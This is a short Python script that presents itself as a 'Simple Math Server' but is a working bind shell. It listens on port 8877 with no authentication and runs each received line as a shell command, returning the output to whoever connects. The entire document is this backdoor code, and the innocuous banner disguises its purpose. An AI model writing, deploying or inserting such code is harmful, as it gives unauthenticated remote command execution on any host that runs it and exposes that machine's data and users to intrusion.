import socket
import subprocess

HOST = ''
PORT = 8877

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen()
conn, addr = s.accept()
print("{} connected with back port {}".format(addr[0], addr[1]))
conn.sendall("Simple Math Server developed by LAHTP \n\n$ ".encode())

while True:
    data = conn.recv(1024)
    if not data:
        break
    else:
        data = data.decode()
        data = data.strip()
        print("cmd > {}".format(data))
        if data == "quit":
            break
        else:
            proc = subprocess.Popen(data, stdout=subprocess.PIPE, shell=True, stderr=subprocess.STDOUT)
            (out, err) = proc.communicate()
            data = "\n" + out.decode()
            data = data + "\r\n$ "
            conn.sendall((data.encode()))
s.close()